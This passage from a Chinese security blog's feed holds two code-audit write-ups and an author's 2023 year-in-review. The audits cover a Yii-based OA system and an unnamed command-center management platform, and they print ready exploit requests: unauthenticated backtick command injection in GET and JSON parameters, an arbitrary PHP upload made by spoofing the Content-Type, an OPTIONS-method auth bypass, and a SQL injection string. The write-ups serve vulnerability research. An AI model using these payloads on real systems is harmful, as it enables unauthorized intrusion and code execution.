class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml">GET /oa/auth/withub?user=emhhbmdzYW4=&amp;token=b336aa3ea64e703583bb7cbe6d924269 HTTP/1.1<br>Host: xxxx<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br><br># user zhangsan<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131931.png" alt="image">​​</p><p>直接跳转即可登录了​​</p><p>‍</p><h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h2><p>这个地方我只能直接封神@up哥 ，我第一次审，没看出来，第二次审，也没看出来，告诉我是权限绕过，我也没审计出来(建议重开) </p><p>找到这个文件 <code>api/modules/v1/controllers/UserController.php</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131053.png" alt="image">​</p><p>我的内心想法和审计思路： 在众多目录中当我看完开发文档中的<code>system</code>​根目录我去瞄一眼<code>api</code>​目录是一件很符合逻辑的事情，细看这里有一个这么写的代码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131177.png" alt="image">​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不需要认证的方法，用下划线形式，如get_info</span><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$notAuthAction</span> = [<span class="hljs-string">&#x27;auth&#x27;</span>,<span class="hljs-string">&#x27;verify-url&#x27;</span>];<br></code></pre></td></tr></table></figure><p>又因为他的方法名为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">actionVerifyUrl</span>()<br><span class="hljs-title function_ invoke__">actionGetInfo</span>() <br><span class="hljs-title function_ invoke__">actionAuth</span>()<br></code></pre></td></tr></table></figure><p>那么通过挖洞大牛子的大脑一眼丁真所以直接传参(所以配合上述来看，<code>actionAuth</code>​  和 <code>VerifyUrl</code>​ 不需要鉴权 )</p><p>那也就是说<code>GetInfo</code>​是需要鉴权的，我们传参进去试试</p><p>这里就有个疑问了？如何传参？(这就需要去熟悉一下<code>Yii</code>​的框架了) 所以从他的<code>/web/</code>​下的入口文件来找到定义<code>/api</code>​的入口 -&gt; <code>oa-api.php</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131317.png" alt="image">​</p><p>那么我尝试了下以下传参后发现返回404</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/oa-api.php/v1/user/getinfo?id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>于是重新回过头来查看这串代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$notAuthAction</span> = [<span class="hljs-string">&#x27;auth&#x27;</span>,<span class="hljs-string">&#x27;verify-url&#x27;</span>];<br></code></pre></td></tr></table></figure><p>发现可能中间会存在<code>-</code>​来进行分割(<del>这是要有多细心</del>)</p><p>所以最终通过以下传参发现成功传入但回显为401证明存在鉴权</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/oa-api.php/v1/user/get-info?id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131007.png" alt="image">​​</p><p>‍</p><p>这里因为他继承了<code>BaseApiController</code>​ 所以跟进父类查看</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131224.png" alt="image">​</p><p>tips: 这里的<code>behaviors</code>​方法应该是会先走的(具体为啥可能因为是<code>yii</code>​框架的原因吧 )</p><p>所以下边有一个<code>||</code>​进行了一个<code>if</code>​判断 (又是猜猜猜了)这里判断登录是否请求方式为<code>OPTIONS</code>​ 或者 是不鉴权的接口(<code>notAuthAction</code>​)就进入下面逻辑，那就猜测通过<code>OPTIONS</code>​后就不鉴权了接口于是构造报文</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131397.png" alt="image">​​​</p><p>‍</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://blog.csdn.net/yang1018679/article/details/105929162">https://blog.csdn.net/yang1018679/article/details/105929162</a> (Yii路由分析一)</li><li><a href="https://blog.csdn.net/yang1018679/article/details/105935326">https://blog.csdn.net/yang1018679/article/details/105935326</a> (Yii路由分析二)</li></ul><p>‍</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>一定要细心，多仔细去猜测开发的思路</li><li>多猜测一些奇怪的写法(以黑盒的逻辑来看白盒)</li><li>要有经验(本次<code>Yii</code>​确实是第一次审 比较吃力了)</li></ul><p>这里小插曲，我非常虚心的去问了一下审计的大牛子，原来发现代码审计如此简单啊！</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401031131522.png" alt="image">​​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计 - PHP - 某管理平台审计</title>
    <link href="/post/code-audit-php-a-management-platform-audit-1ckgkn.html"/>
    <url>/post/code-audit-php-a-management-platform-audit-1ckgkn.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>‍</p><p>代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是某指挥中心公司，闭源的代码写的是真的非常粗糙，非常好审计，简单带过下</p><p>‍</p><h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>‍</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>‍</p><h3 id="RCE1"><a href="#RCE1" class="headerlink" title="RCE1"></a>RCE1</h3><p>‍</p><p>危险函数的搜索(故审计上传 sql RCE 即可)</p><p>在搜索<code>eval(</code>​的时候发现了<code>\app\exec\exec.php</code>​ 存在可控点</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016291.png" alt="image">​</p><p>原本以为能够直接RCE的，但是发现在开头的时候存在以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;includes/checkauth.php&quot;</span>;<br></code></pre></td></tr></table></figure><p>那么一看其实就是一个鉴权代码，那么于是我就跑了一遍未授权的php文件，发现<code>/api</code>​ <code>/custom</code>​ <code>/app部分</code>​都是不鉴权的(自己开发的没啥价值就不公开了)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016610.png" alt="image">​</p><p>‍</p><p>于是就是从这个未授权的php文件中查找(就查找危险函数的时候看看目录在不在这里头就行)</p><p>tips: 这里有个要注意的点，就是<code>PHP</code>​代码尽量用<code>seay</code>​ 其实感觉<code>PHPSTORM</code>​有时候搜索的真的会遗漏比如这次的搜索 <code>exec</code>​ 跟 <code>exec </code>​ 这两个搜索到的结果是不同的，我直接搜索<code>exec</code>​是不会有真正存在漏洞的函数的(<del>我也不知道为啥</del>)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016806.png" alt="image">​</p><p>又因为寻找未授权的php文件中我发现大量在<code>api</code>​目录下的php文件都是未授权的，所以就去看了<code>\api\client\invite2videoconf.php</code>​</p><p>找到<code>cmd_async</code>​方法发现是默认调用的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016915.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016025.png" alt="image">​</p><p>如果我们可以控制<code>$conf_cmd</code>​ 就可以达到RCE的效果</p><p>跟进后发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conf_cmd</span> = <span class="hljs-string">&quot;bgapi sched_api +&quot;</span>.<span class="hljs-variable">$sched_seconds</span>.<span class="hljs-string">&quot; none bgapi originate &#123;rtp_force_video_fmtp=&#x27;profile-level-id=428016;max-mbps=20250;max-fs=1200&#x27;,effective_caller_id_name=<span class="hljs-subst">$effective_name</span>,absolute_codec_string=^^:opus@16000h@20i:PCMA:PCMU:H264,ignore_early_media=true,origination_caller_id_name=<span class="hljs-subst">$conference_number</span>,origination_caller_id_number=<span class="hljs-subst">$conference_number</span>,call_direction=outbound&#125;<span class="hljs-subst">$bridge_array</span>[0] <span class="hljs-subst">$conference_number</span> xml default&quot;</span>;<br></code></pre></td></tr></table></figure><p>那也就是找<code>$sched_seconds</code>​ <code>$effective_name</code>​ <code>$conference_number</code>​ <code>$conference_number</code>​ <code>$bridge_array</code>​ 变量哪些是可控的</p><p>我们可以发现这个<code>$conference_number</code>​ 是可以通过<code>GET</code>​直接传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conference_number</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;roomid&#x27;</span>];<br></code></pre></td></tr></table></figure><p>但是这里前提还是需要进入到<code>$conf_cmd</code>​所在的循环，所以我们打个断点试试(<del>断点起不来，只能硬看了</del>)</p><p>查看判断逻辑，发现只有一个地方我们可以控制的，其他的都是我们的服务端(也就是说，能不能成功，就看服务器能不能进入这个if判断逻辑了)那么我们唯一可控的就是<code>$callee_number</code>​这个参数了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016132.png" alt="image">​</p><p>从判断逻辑来看，他的数量不能够太多，所以我们只需要写一个参数即可</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016289.png" alt="image">​</p><p>那么构造下payload试试(只需要加入一些能够命令执行的符号即可执行命令先(CTF太常见了))</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /api/client/invite2videoconf.php?callee=1&amp;roomid=`<span class="hljs-built_in">ls</span>&gt;aaa.txt` HTTP/1.1<br>Host: &#123;&#123;Hostname&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016414.png" alt="image">​​</p><h3 id="RCE2-3"><a href="#RCE2-3" class="headerlink" title="RCE2+3"></a>RCE2+3</h3><p>‍</p><p>这里就有点新颖的思路了，除了继续搜索<code>exec</code>​之外，这里我是直接搜索了<code>cmd_async</code>​函数，发现也非常多不同的文件名引用了并且后续写法大差不差(这其实也是审计中非常常见的一种方法，猜测开发的开发习惯来审计)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016522.png" alt="image">​​</p><p>写法是一样的 都是通过<code>GET</code>​去传参然后执行一下并且没有鉴权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /api/client/invite2videoconf.php?callee=1&amp;roomid=`<span class="hljs-built_in">id</span>&gt;1.txt` HTTP/1.1<br>Host: &#123;&#123;Hostname&#125;&#125;<br><br>GET /api/client/vmonitor.php?extension=1&amp;calleeuuid=`<span class="hljs-built_in">id</span>&gt;1.txt` HTTP/1.1<br>Host: &#123;&#123;Hostname&#125;&#125;<br></code></pre></td></tr></table></figure><p>‍</p><h3 id="RCE4"><a href="#RCE4" class="headerlink" title="RCE4"></a>RCE4</h3><p>‍</p><p>也是一样通过上述方法搜索到该文件 <code>\restapi\restcontroler.php</code>​这个文件下还是存在命令参数的拼接的，但是需要一些跟进逻辑</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292112646.png" alt="image">​</p><p>首先<code>GET</code>得传<code>request</code>进入if判断 也就是两个数组的事情，也就是exp中的<code>?request=conference/mute_member</code></p><p>这里有个注意的点(傻呗冬夏跟我说这个点看了一晚上)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>),<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016756.png" alt="image">​</p><p>直接拼接可以使用反引号来进行执行命令</p><p>这里有两个注意要点</p><ol><li><code>Content-Type: application/json</code>​</li><li><code>&#123;&quot;id&quot;:&quot;ls&gt;/tmp/333.txt&quot;&#125;</code>​  Json要双引号</li></ol><p>报文</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /restapi/restcontroler.php?request=conference/mute_member HTTP/1.1<br>Host: xxx<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cache-Control: max-age=0<br>Connection: close<br>Content-Length: 0<br>Content-Type: application/json<br>Origin: http://127.0.0.1<br>Sec-Fetch-Dest: document<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-User: ?1<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36<br>sec-ch-ua: <br>sec-ch-ua-mobile: ?0<br>sec-ch-ua-platform: <span class="hljs-string">&quot;&quot;</span><br><br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;`ls&gt;/tmp/333.txt`&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>即可在tmp目录写入333.txt</p><p>‍</p><p>‍</p><h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><p>‍</p><h3 id="上传1"><a href="#上传1" class="headerlink" title="上传1"></a>上传1</h3><p>‍</p><p>全局搜索了下<code>move_uploaded_file(</code>​ 感觉有点像后门的写法了<code>\api\client\upload.php</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016879.png" alt="image">​​</p><p>在未授权的文件中我翻到了<code>\custom\zx\upload.php</code>​ 是未授权的</p><p>其实查看逻辑我们就可以发现，他仅仅只是对<code>type</code>​做了限制，并没有限制后缀，本地测试个demo即可看明白</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]);<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016019.png" alt="image">​​</p><p>只要修改<code>type</code>​即可成功绕过限制了</p><p>给出exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /api/client/upload.php HTTP/1.1<br>Host: xxx<br>Content-Length: 300<br>Cache-Control: max-age=0<br>sec-ch-ua: <br>sec-ch-ua-mobile: ?0<br>sec-ch-ua-platform: <span class="hljs-string">&quot;&quot;</span><br>Upgrade-Insecure-Requests: 1<br>Origin: http://127.0.0.1<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydug0EI1Kd1Yk6g3B<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-User: ?1<br>Sec-Fetch-Dest: document<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br><br>------WebKitFormBoundarydug0EI1Kd1Yk6g3B<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;ulfile&quot;</span>; filename=<span class="hljs-string">&quot;pf.php&quot;</span><br>Content-Type: image/jpg<br><br><br>&lt;?php <span class="hljs-built_in">echo</span> 1111;?&gt;<br>------WebKitFormBoundarydug0EI1Kd1Yk6g3B<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span><br><br>鎻愪氦<br>------WebKitFormBoundarydug0EI1Kd1Yk6g3B--<br></code></pre></td></tr></table></figure><h3 id="上传2"><a href="#上传2" class="headerlink" title="上传2"></a>上传2</h3><p>‍</p><p>就不过多重复，这套源码，只要未授权，和鉴权<code>type</code>​都是任意文件上传(都非常多任意文件上传)</p><p>​​</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>‍</p><p>全局搜索<code>select</code>​发现很多地方都是直接拼接后直接进行sql查询 <code>_query( $_sql );</code>​ 并没有做过多的预编译操作</p><p>单引号报错了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016143.png" alt="image">​​</p><p>再加个单引号就没有报错 ，证实是字符型，但是这里存在一个问题，请看截图</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?usernumber<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and/**/1=1--+</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016268.png" alt="image">​​</p><p>但是使用1&#x3D;2竟然也回显成功了，emmm有点奇怪，所以我在这里尝试使用一些布尔或者延时都不成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?usernumber<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and/**/1=2--+</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016391.png" alt="image">​​</p><p>具体原理是啥存疑了，但是后面通过模糊查询找到(说到是 能不用注释符就不用，能直接闭合就直接闭合，这里必须用or 因为or了之后才会查询到东西)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /custom/zx/departments.php?usernumber=1<span class="hljs-string">&#x27;or+user()+like+&#x27;</span>a% HTTP/1.1<br>Host: xxx<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cache-Control: max-age=0<br>Connection: close<br>Origin: http://127.0.0.1<br>Sec-Fetch-Dest: document<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-User: ?1<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36<br>sec-ch-ua: <br>sec-ch-ua-mobile: ?0<br>sec-ch-ua-platform: <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016520.png" alt="image">​​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292016646.png" alt="image">​​</p><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>总结 - 2023年度总结 </title>
    <link href="/post/summary-2023-tdfez.html"/>
    <url>/post/summary-2023-tdfez.html</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在是12.25日吧恰好圣诞节，于是开始着手于写写我今年的总结，今年从大二到了大三，经历了非常非常多的事情和变故，但从我个人的提升来说，还是非常值得记录的，今天要去南京见见强大的Pwn爹们，@ha1vk @z1r0 @K0u_az  去南京逛两圈先哈哈，还是套了下团队的模版吧好有个方向来写</p><p>‍</p><h1 id="Zjacky-2023-年报"><a href="#Zjacky-2023-年报" class="headerlink" title="Zjacky - 2023 年报"></a>Zjacky - 2023 年报</h1><p>‍</p><h2 id="自己如何看待自己"><a href="#自己如何看待自己" class="headerlink" title="自己如何看待自己"></a>自己如何看待自己</h2><ul><li><p>多角度的剖析与反思</p><p>关于反思的话：今年是提升迅速的一年，让我从一个什么都不知道的小白，到慢慢的加入到CTF的圈子当中，从一步一步不懂原理，不懂渗透，迷茫当中，再到认识Java，学习Java，输出CTF，做出题目，每天日复一日的学习和计划，除了@星盟安全团队的一些催促之下，也有很多师傅的竞争让我不能停下脚步 比如 @清风 –&gt;真正的卷王，从早卷Java，@lengf233 –&gt; 也是卷王，天天学天天学 @xiaoqiuxx –&gt; 他主要是太强了(他经常卷但给你说”我TM今天又什么都没干”) 当然还有很多很多帮助过我的师傅们，害，给师傅们看看我被逼疯了的学习计划吧哈哈</p></li><li></li><li><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281517094.png" alt="image">​</p></li><li><p>当然也是写了一年了这个计划表</p></li><li><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281517364.png" alt="image">​</p></li></ul><p>‍</p><h2 id="今年做了哪些事情"><a href="#今年做了哪些事情" class="headerlink" title="今年做了哪些事情"></a>今年做了哪些事情</h2><p>  各种比赛各种护网各种项目(陇剑杯 强网杯 市护网 国护 等等等等 )</p><p>  当然也学到了很多东西，入门了渗透 入门了java 入门了审计 入门了内网 等等等等</p><p>  今年确实也是学到了非常非常多的一年！</p><p>‍</p><p>‍</p><h2 id="今年那些喜悦、遗憾和最难忘的事"><a href="#今年那些喜悦、遗憾和最难忘的事" class="headerlink" title="今年那些喜悦、遗憾和最难忘的事"></a>今年那些喜悦、遗憾和最难忘的事</h2><p>今年不仅自己的成长飞快，也认识到了非常多的师傅，陇剑见到了@EX @z1r0 @N1_ght @xshhc 鹏城也见到了很多很多师傅 @xiaoqiuxx @清风 @十七 @lengf233 等等等等 蓝帽也见了很多 @AndyNoel 太多太多了 ，也去了16个城市 真的太值得纪念了</p><p>下面浅炫耀下我的高德和航旅</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281517508.jpg" alt="1ee0fbedfc4d057cf07d68ac286ad23">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281517689.jpg" alt="62f403282520af32fbc7cd79ae1d32d">​</p><p>(公费旅游确实是非常不错的，加上也成功让自己经济独立，还是很值得庆幸的，也没有白费了努力过的自己)</p><p>‍</p><p>‍</p><h2 id="今年自己的进步与成长收获"><a href="#今年自己的进步与成长收获" class="headerlink" title="今年自己的进步与成长收获"></a>今年自己的进步与成长收获</h2><p>‍</p><p>今年肯定是遇到了很多很多学习上的坎坷，比如接触到了更多很难看懂的知识点，Web方向真的太多太多东西去学习了，自己的基础也是太薄弱了，在今年我其实深深的知道，自己并没有一些师傅学的东西多，我仅仅只是学到了一些皮毛而已，也就是个纯纯的jio本小子，但反而我还接了培训，接了代打，接了项目，反正目的是更多的钱，但在几次培训下来慢慢地发现，技术还是需要沉淀，要真的静下心来慢慢地学，好好的巩固，练习，所以于是我还是加入了@赛博昆仑的攻防实验室进行一些实战项目的触碰，希望在接下来的实习当中能够学有所成，我其实也并没有考研的想法，我知道自己真没有考试命了，还是乖乖打工吧</p><p>‍</p><h2 id="明年你对自己有哪些期望，以及来年的计划以及今年flag的完成情况"><a href="#明年你对自己有哪些期望，以及来年的计划以及今年flag的完成情况" class="headerlink" title="明年你对自己有哪些期望，以及来年的计划以及今年flag的完成情况"></a>明年你对自己有哪些期望，以及来年的计划以及今年flag的完成情况</h2><p>先看看我今年的flag完成了几个吧，5&#x2F;10 刚好五五开了呜呜呜，很庆幸遇到了一些比较好的师傅让我有能力和技术挖到了第一张，第二张，第三张属于自己的CNVD，CVE，CNNVD，也在今年的成长中获取了很多技术支持，金钱支持，赚到了人生的第一桶大金，但现在其实还是CTF跟渗透半桶水，只能说停留在刚入门进阶的地方吧，往后还有非常多的东西要去学，还是得卷啊</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. <span class="hljs-comment"># 挖到人生第一个CNVD/CVE                        成功完成！不止一张</span><br>2. <span class="hljs-comment"># 护网蓝中                                     成功完成！赚到了?w了</span><br>3. <span class="hljs-comment"># CTF赛事进一次前三                            完成！拿到全市第一</span><br>4. <span class="hljs-comment"># 跟女朋友长长久久                             很好的感情，也有需要磨合的点，但还是很好呢</span><br>5. <span class="hljs-comment"># 拿到5张edu的证书                            没完成呜呜呜，没时间挖洞，只能说不会挖洞</span><br>6. <span class="hljs-comment"># 搭建一台环境很棒的服务器                     呜呜呜，还是差强人意啊</span><br>7. <span class="hljs-comment"># 在先知社区发表一篇文章                       做到了！</span><br>8. <span class="hljs-comment"># 打够一百台靶机(/100)                        害，有点好高骛远了，应该打了20多台吧，100台还是太难了</span><br>9. <span class="hljs-comment"># 做一次渗透的项目                            江门 常州 都做了哈哈</span><br>10.<span class="hljs-comment"># 拿一次奖学金                                综测第6但没办法成绩真的有点低</span><br></code></pre></td></tr></table></figure><p>‍</p><h3 id="2024年的flag"><a href="#2024年的flag" class="headerlink" title="2024年的flag"></a>2024年的flag</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml">1. 跟女朋友长长久久吧(她是是一个非常朴素的女孩 好好珍惜才是)<br>2. 在奇安信攻防社区发布一篇高质量攻防文章<br>3. 赚到第一个20w<br>4. 出一次国<br>5. 找到一份令自己满意的工作(能转正)<br>6. 独自审出一个0day<br>7. 换一台电脑(主机)<br>8. 不再恐惧Java<br>9. 线下打一场有价值的CTF赛事(网鼎orxxxx)<br>10. 做出一次CTF的一血(对我好困难呜呜呜(肯定不能简单的啊))<br></code></pre></td></tr></table></figure><p>‍</p><h2 id="结语"><a href="#结语" 